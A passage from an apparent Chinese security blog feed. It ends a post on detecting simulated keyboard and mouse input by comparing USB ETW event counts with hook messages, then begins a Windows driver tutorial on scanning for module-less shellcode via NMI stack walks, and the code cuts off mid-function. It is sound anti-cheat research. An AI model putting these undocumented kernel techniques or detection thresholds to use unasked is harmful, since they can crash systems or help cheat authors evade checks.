的值做比对，看看是不是四倍的关系，若是则没有使用键盘模拟。</p><p>实际测试的时候，键盘按下时消息长度的对应属性值应该是 0x25，鼠标移动和点击事件的长度对应的属性值为 0x9。今非昔比了，改了也可以理解。</p><p>而按下按键的时候有概率触发 8 个事件，也有可能触发 6 个事件，也有可能是4个事件，这个好像还真是看脸了。但是通过一个驱动模拟按键则是不会触发任何 etw 的事件。鼠标点击来说，每次触发 4 个事件是没有问题的。</p><p>检测键盘的思路就是，每次收到键盘的etw事件，让etw计数器 +1，同时 hook windows 消息，每次接收到非F1的按键也让按键计数器 +1，最后只要 <code>etwCount &lt; 6*Win32Count</code> 则可以直接判定为使用了键盘模拟。</p><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>这里让etw每次记录时输出，keyboard每次收到消息时输出当前按键次数。</p><p>首先是正常情况下的按键。</p><img src="/2024/07/08/etw/3.png" class=""><p>因为etw接受消息有一定的延迟，所以中间输出结果可能有点不对，但是最终结果是在偏差范围内的，即 <code>4*Win32Count&lt;=etwCount&lt;=8*Win32Count</code>。</p><p>一般上限不会超，所以检测下限即可。</p><img src="/2024/07/08/etw/4.png" class=""><p>自然是不会超的。</p><p>如果是按键模拟，这里我找了一个开源项目的模拟按键来测试。</p><p>它可以一直触发消息而不触发 etw。</p><img src="/2024/07/08/etw/5.png" class=""><p>结果自然而然的是会触发到模拟器检测的。</p><p>虽然不知道它按键数据怎么分析，而且会有一定的随机性，但是对于检测模拟类外挂来说足矣。只要取一段区间，它的模拟按键次数大于实际键盘按键次数，那么必能检测到的，通过一定的数学推导也不难得到。</p><h3 id="深入了解"><a href="#深入了解" class="headerlink" title="深入了解"></a>深入了解</h3><p>因为这个协议没有被文档话，而根据 8 年前的 poc 去解析协议得到的是全 0 数据，那么只能是想办法自己找准具体的协议了。</p><p>首先按 <code>aba</code> 得到所有跟键盘事件相关的事件包。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">98 af cf b8 77 4a 00 00 d8 df c0 b9 77 4a 00 00 b0 5a 60 4d 88 b5 ff ff 60 69 57 4d 88 b5 ff ff e0 65 9c 61 88 b5 ff ff 80 00 09 00 00 00 00 40 d8 df c0 b9 77 4a 00 00 00 00 00 00 00 00 00 00 b0 5a 60 4d 88 b5 ff ff 03 00 00 00 25 00 00 00 90 14 4f 4d 88 b5 ff ff 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 04 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">98 af cf b8 77 4a 00 00 d8 df c0 b9 77 4a 00 00 b0 5a 60 4d 88 b5 ff ff 60 69 57 4d 88 b5 ff ff 50 43 b5 56 88 b5 ff ff 80 00 09 00 00 00 00 40 d8 df c0 b9 77 4a 00 00 00 00 00 00 00 00 00 00 b0 5a 60 4d 88 b5 ff ff 03 00 00 00 25 00 00 00 90 14 4f 4d 88 b5 ff ff 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 04 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">98 af cf b8 77 4a 00 00 d8 df c0 b9 77 4a 00 00 b0 5a 60 4d 88 b5 ff ff 60 69 57 4d 88 b5 ff ff f0 63 d8 61 88 b5 ff ff 80 00 09 00 00 00 00 40 d8 df c0 b9 77 4a 00 00 00 00 00 00 00 00 00 00 b0 5a 60 4d 88 b5 ff ff 03 00 00 00 25 00 00 00 90 14 4f 4d 88 b5 ff ff 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 04 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br></pre></td></tr></table></figure><p>这里都取第一个抓到的数据，可以发现第一个数据包只有 +20 开始往后 4 个字节不一样，而且相同按键之间似乎没有太多联系。一次键盘事件可以看作是键盘按下和弹起两个子事件，而这两个子事件分别会触发 2 或者 4 个etw事件。</p><p>通过研究事件的关系可以看出，按下的时候，若开始事件为 26，则接下来到来的事件还是 26，随后是 27，26。如果开始事件是 27，则之后单走一个 26。弹起大部分情况都是 <code>(27,26)*2</code>，长度为 4 的比较难复现出来，但是可以通过排除连续的 2 个 26 事件达到尽可能地使得随机性减少。</p><blockquote><p>这里解释一下我描述的事件，我上面两段话所说的“到来的事件”均指的是携带了键盘数据的 etw 事件。根据时间轴来看，事件到来的顺序是 26 与 27 交替到来，那么从时间轴来看，“连续的两个 26 事件”指的是两个携带了键盘数据的 26 事件中间夹杂了一个没有携带键盘数据的 27 事件。</p><p>而携带键盘数据正如最开始解释的，<code>fid_URB_TransferBufferLength</code> 属性值为 0x25 的事件。</p></blockquote><p>从抓包数据可以分析。</p><img src="/2024/07/08/etw/6.png" class=""><ul><li>27 事件的数据长度为 172。</li><li>26 事件的数据长度为 168。</li></ul><p>从上面分析的抓包信息得知，抓到的数据包都是 26 事件，因此可以尝试抓 aba 键盘按下所产生的 27 事件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">98 af cf b8 77 4a 00 00 d8 df c0 b9 77 4a 00 00 b0 5a 60 4d 88 b5 ff ff 60 69 57 4d 88 b5 ff ff 50 24 f0 5d 88 b5 ff ff 80 00 09 00 00 00 00 00 d8 df c0 b9 77 4a 00 00 00 00 00 00 00 00 00 00 b0 5a 60 4d 88 b5 ff ff 03 00 00 00 25 00 00 00 90 14 4f 4d 88 b5 ff ff 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 04 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">98 af cf b8 77 4a 00 00 d8 df c0 b9 77 4a 00 00 b0 5a 60 4d 88 b5 ff ff 60 89 57 4d 88 b5 ff ff e0 4c f0 5d 88 b5 ff ff 80 00 09 00 00 00 00 00 d8 df c0 b9 77 4a 00 00 00 00 00 00 00 00 00 00 b0 5a 60 4d 88 b5 ff ff 03 00 00 00 25 00 00 00 d0 14 4f 4d 88 b5 ff ff 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 04 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">98 af cf b8 77 4a 00 00 d8 df c0 b9 77 4a 00 00 b0 5a 60 4d 88 b5 ff ff 60 89 57 4d 88 b5 ff ff e0 4c f0 5d 88 b5 ff ff 80 00 09 00 00 00 00 00 d8 df c0 b9 77 4a 00 00 00 00 00 00 00 00 00 00 b0 5a 60 4d 88 b5 ff ff 03 00 00 00 25 00 00 00 d0 14 4f 4d 88 b5 ff ff 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 04 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br></pre></td></tr></table></figure><p>发现只有 +80 字节有差异，要么是 0xd0 要么是 0x90，没有别的情况，其它的数据基本一模一样了。</p><p>因此从协议去分析，直接卒了。</p><h3 id="鼠标模拟检测"><a href="#鼠标模拟检测" class="headerlink" title="鼠标模拟检测"></a>鼠标模拟检测</h3><p>前面分析过，长度为 9 的数据是鼠标信息，经过测试，每次移动（大约 0.5 - 1.5 个像素），点击或者其它的鼠标操作都会触发 etw，当然模拟的同样不会触发，那么消息钩子和etw事件数是否会有一定的联系呢？答案是肯定的，这里稍微改一下，然后让左键输出 etwCount 和 win32Count 的值以及比值。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">LRESULT</span><br><span class="line">    <span class="title function_">Win32Callback</span><span class="params">(</span></span><br><span class="line"><span class="params">    __in INT    Code,</span></span><br><span class="line"><span class="params">    __in WPARAM WParam,</span></span><br><span class="line"><span class="params">    __in LPARAM LParam</span></span><br><span class="line"><span class="params">)</span></span><br><span class="line">&#123;</span><br><span class="line">    KBDLLHOOKSTRUCT* key = (KBDLLHOOKSTRUCT*)LParam;</span><br><span class="line">    <span class="keyword">if</span> (WParam == WM_LBUTTONUP) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>, win32Count, etwCount);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;rate: %f\n&quot;</span>, <span class="number">1.0</span> * etwCount / win32Count);</span><br><span class="line">    &#125;</span><br><span class="line">    win32Count++;</span><br><span class="line">    <span class="keyword">return</span> CallNextHookEx(MouseHook,</span><br><span class="line">                          Code,</span><br><span class="line">                          WParam,</span><br><span class="line">                          LParam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2024/07/08/etw/7.png" class=""><p>基本是可以得到结论 <code>etwCount / win32Count</code> 大概是在 2 左右的比值，可能有略微的浮动，</p><p>可以设置一个比较低的阈值，比如 1.5，如果发现低于这个值则直接判定为使用了鼠标模拟，这里略微改一下左键的事件可以达到。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">LRESULT</span><br><span class="line">    <span class="title function_">Win32Callback</span><span class="params">(</span></span><br><span class="line"><span class="params">    __in INT    Code,</span></span><br><span class="line"><span class="params">    __in WPARAM WParam,</span></span><br><span class="line"><span class="params">    __in LPARAM LParam</span></span><br><span class="line"><span class="params">)</span></span><br><span class="line">&#123;</span><br><span class="line">    KBDLLHOOKSTRUCT* key = (KBDLLHOOKSTRUCT*)LParam;</span><br><span class="line">    <span class="keyword">if</span> (WParam == WM_LBUTTONUP) &#123;</span><br><span class="line">        <span class="type">double</span> rate = <span class="number">1.0</span> * etwCount / win32Count;</span><br><span class="line">        system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>, win32Count, etwCount);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;rate: %f\n&quot;</span>, <span class="number">1.0</span> * etwCount / win32Count);</span><br><span class="line">        <span class="keyword">if</span> (rate &lt; <span class="number">1.5</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Mouse sim detected\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Mouse sim not found\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        etwCount = <span class="number">0</span>;</span><br><span class="line">        win32Count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    win32Count++;</span><br><span class="line">    <span class="keyword">return</span> CallNextHookEx(MouseHook,</span><br><span class="line">                          Code,</span><br><span class="line">                          WParam,</span><br><span class="line">                          LParam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正常情况刚才已经试验过了，肯定是不会触发的，这里使用一款鼠标模拟器[3]去点击看看能否检测到，因为存在延时的缘故，建议移动之后等待 2s 左右再按下左键。</p><img src="/2024/07/08/etw/8.png" class=""><p>在经过一系列移动之后点击左键显然也可以成功检测到模拟器。</p><h3 id="方案实现"><a href="#方案实现" class="headerlink" title="方案实现"></a>方案实现</h3><p>鼠标模拟检测方案需要上最终实现的话还有很多问题需要解决，大概罗列了一些。</p><ul><li>etw 事件是异步的，etw事件上报延时需要考虑。</li><li>不同操作系统的事件上报协议可能有所不同，需要对大部分主流的 windows 版本都做适配才能放入最终方案。</li><li>因为只检测了指定 usb3.0 的provider 给定的事件，如果鼠标-键盘设备不是走 usb 协议（如蓝牙鼠标或键盘）则可能会误报。但是个人测试下来，一般笔记本内置和常见的有线外接键盘鼠标都可以被检测到。</li></ul><p>对于以上的问题，也提出几个可能解决的方案。对于第一个异步的问题，既然没有办法让 etw 变为同步上报，那么可以考虑适当放宽检测条件平衡这个误差。例如，取 60 秒时间内产生的鼠标-键盘消息和etw事件，计算比例看是否在合理的范围内。或者取 10w 次的etw事件为阈值，判断这期间内的鼠标键盘消息是否高于 5w（5w为鼠标，键盘则需要放低到 2.5w 左右），若高于则直接判定为使用了模拟器。</p><p>对于第二个问题，不同版本的操作系统协议确实也是一个大问题，因为微软没有官方的文档指示如何解析上报事件的协议，因此对于不同版本的操作系统只能是尽可能去测试完善得到最终方案。</p><p>对于第三个问题，游戏方如果强制玩家使用 usb3.0 协议的鼠标，则会显得不够亲民，但是是最简单暴力的办法。或者去研究蓝牙设备的etw事件，对此做适配。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>[1]：<a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/devtest/event-tracing-for-windows--etw-">https://learn.microsoft.com/zh-cn/windows-hardware/drivers/devtest/event-tracing-for-windows--etw-</a></li><li>[2]：<a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/usbcon/how-to-capture-a-usb-event-trace3">https://learn.microsoft.com/zh-cn/windows-hardware/drivers/usbcon/how-to-capture-a-usb-event-trace3</a></li><li>[3]：<a href="https://github.com/taojy123/KeymouseGo">https://github.com/taojy123/KeymouseGo</a></li></ul>]]></content>
    
    
    <summary type="html">尝试做一做模拟类外挂检测</summary>
    
    
    
    <category term="Windows" scheme="https://xia0ji233.github.io/categories/Windows/"/>
    
    <category term="Gamesec" scheme="https://xia0ji233.github.io/categories/Windows/Gamesec/"/>
    
    
  </entry>
  
  <entry>
    <title>Windows驱动开发（13）——shellcode查找</title>
    <link href="https://xia0ji233.github.io/2024/06/28/driver13/"/>
    <id>https://xia0ji233.github.io/2024/06/28/driver13/</id>
    <published>2024-06-28T10:00:00.000Z</published>
    <updated>2024-06-28T10:02:51.676Z</updated>
    
    <content type="html"><![CDATA[<p>驱动层捕获无模块shellcode。</p><span id="more"></span><p>这里学一手扫描 shellcode 的方法，题目来源于 2024 年的腾讯游戏安全竞赛的决赛。</p><h2 id="扫描shellcode"><a href="#扫描shellcode" class="headerlink" title="扫描shellcode"></a>扫描shellcode</h2><p>主要方法是插中断扫栈和扫内存。这里调几个复现了的方法去讲，中断有 DPC，NMI，IPI 这几类。扫内存可以扫 BigPool，扫页表，扫物理内存。</p><h3 id="NMI"><a href="#NMI" class="headerlink" title="NMI"></a>NMI</h3><p>NMI (Non Maskable Interrupt)——不可屏蔽中断（即CPU不能屏蔽）无论状态寄存器中 IF 位的状态如何，CPU收到有效的NMI必须进行响应，它在被响应时无中断响应周期。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntifs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntdef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntstatus.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntddk.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntstrsafe.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> kprintf(format, ...) DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, format, ##__VA_ARGS__)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_BACKTRACE_DEPTH 20</span></span><br><span class="line">ULONG64 num = <span class="number">0</span>;</span><br><span class="line">NTSTATUS <span class="title function_">EnumerateKernelThreads</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">NTSTATUS</span> <span class="params">(*ZWQUERYSYSTEMINFORMATION)</span><span class="params">(ULONG, PVOID, ULONG, PULONG)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(__fastcall *_HalSendNMI)</span><span class="params">(ULONG64 a1)</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">KAFFINITY_EX</span> &#123;</span></span><br><span class="line">    SHORT Count;</span><br><span class="line">    SHORT Size;</span><br><span class="line">    ULONG Padding;</span><br><span class="line">    ULONG64 bitmap[<span class="number">20</span>];</span><br><span class="line">&#125; KAFFINITYEX, * PKAFFINITYEX;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(__fastcall* _KeInitializeAffinityEx)</span><span class="params">(PKAFFINITYEX pkaff)</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(__fastcall* _KeAddProcessorAffinityEx)</span><span class="params">(PKAFFINITYEX pkaff, ULONG nmu)</span>;</span><br><span class="line"></span><br><span class="line">PDRIVER_OBJECT g_Object = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LDR_DATA_TABLE_ENTRY</span> &#123;</span></span><br><span class="line">    LIST_ENTRY InLoadOrderLinks;</span><br><span class="line">    LIST_ENTRY InMemoryOrderLinks;</span><br><span class="line">    LIST_ENTRY InInitializationOrderLinks;</span><br><span class="line">    PVOID DllBase;</span><br><span class="line">    PVOID EntryPoint;<span class="comment">//驱动的进入点 DriverEntry  </span></span><br><span class="line">    ULONG SizeOfImage;</span><br><span class="line">    UNICODE_STRING FullDllName;<span class="comment">//驱动的满路径  </span></span><br><span class="line">    UNICODE_STRING BaseDllName;<span class="comment">//不带路径的驱动名字  </span></span><br><span class="line">    ULONG Flags;</span><br><span class="line">    USHORT LoadCount;</span><br><span class="line">    USHORT TlsIndex;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        LIST_ENTRY HashLinks;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            PVOID SectionPointer;</span><br><span class="line">            ULONG CheckSum;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            ULONG TimeDateStamp;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            PVOID LoadedImports;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125; LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SYSTEM_MODULE_INFORMATION_ENTRY</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ULONG Unknow1;</span><br><span class="line">    ULONG Unknow2;</span><br><span class="line">    ULONG Unknow3;</span><br><span class="line">    ULONG Unknow4;</span><br><span class="line">    PVOID Base;</span><br><span class="line">    ULONG Size;</span><br><span class="line">    ULONG Flags;</span><br><span class="line">    USHORT Index;</span><br><span class="line">    USHORT NameLength;</span><br><span class="line">    USHORT LoadCount;</span><br><span class="line">    USHORT ModuleNameOffset;</span><br><span class="line">    <span class="type">char</span> ImageName[<span class="number">256</span>];</span><br><span class="line">&#125; SYSTEM_MODULE_INFORMATION_ENTRY, *PSYSTEM_MODULE_INFORMATION_ENTRY;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SYSTEM_MODULE_INFORMATION</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ULONG Count;<span class="comment">//内核中以加载的模块的个数</span></span><br><span class="line">    SYSTEM_MODULE_INFORMATION_ENTRY Module[<span class="number">1</span>];</span><br><span class="line">&#125; SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PVOID callers[<span class="number">20</span>];</span><br><span class="line">ULONG count = <span class="number">20</span>;</span><br><span class="line">ULONG numFrames = <span class="number">0</span>;</span><br><span class="line">PVOID ModuleBase[<span class="number">2000</span>];</span><br><span class="line">ULONG ModuleSize[<span class="number">2000</span>];</span><br><span class="line">ULONG CountOfModule = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">VOID <span class="title function_">DRIVERUNLOAD</span><span class="params">(_In_ <span class="keyword">struct</span> _DRIVER_OBJECT* DriverObject)</span></span><br><span class="line">&#123;</span><br><span class="line">    kprintf((<span class="string">&quot;unload\n&quot;</span>));</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">NmiCallbackForCheck</span><span class="params">(PVOID Context,BOOLEAN handule)</span> &#123;</span><br><span class="line">    numFrames = RtlWalkFrameChain(callers,count,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">NMISearch</span><span class="params">()</span> &#123;</span><br><span class="line">    NTSTATUS status; </span><br><span class="line">    PVOID NmiCallbackHandle; </span><br><span class="line">    ULONG ProcessorCount; </span><br><span class="line">    KAFFINITYEX NmiAffinity;</span><br><span class="line"></span><br><span class="line">    UNICODE_STRING SystemRoutineName;</span><br><span class="line">    ULONG numCors = KeQueryActiveProcessorCountEx(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    RtlInitUnicodeString(&amp;SystemRoutineName, <span class="string">L&quot;HalSendNMI&quot;</span>);</span><br><span class="line">    _HalSendNMI HalSendNMI = MmGetSystemRoutineAddress(&amp;SystemRoutineName);</span><br><span class="line">    <span class="keyword">if</span> (!HalSendNMI) &#123;</span><br><span class="line">        kprintf((<span class="string">&quot;Failed to get HalSendNMI address\n&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span> STATUS_UNSUCCESSFUL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    RtlInitUnicodeString(&amp;SystemRoutineName, <span class="string">L&quot;KeInitializeAffinityEx&quot;</span>);</span><br><span class="line">    _KeInitializeAffinityEx KeInitializeAffinityEx = MmGetSystemRoutineAddress(&amp;SystemRoutineName);</span><br><span class="line">    <span class="keyword">if</span> (!KeInitializeAffinityEx) &#123;</span><br><span class="line">        kprintf((<span class="string">&quot;Failed to get KeInitializeAffinityEx address\n&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span> STATUS_UNSUCCESSFUL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    RtlInitUnicodeString(&amp;SystemRoutineName, <span class="string">L&quot;KeAddProcessorAffinityEx&quot;</span>);</span><br><span class="line">    _KeAddProcessorAffinityEx KeAddProcessorAffinityEx = MmGetSystemRoutineAddress(&amp;SystemRoutineName);</span><br><span class="line">    <span class="keyword">if</span> (!KeAddProcessorAffinityEx) &#123;</span><br><span class="line">        kprintf((<span class="string">&quot;Failed to get KeAddProcessorAffinityEx address\n&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span> STATUS_UNSUCCESSFUL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 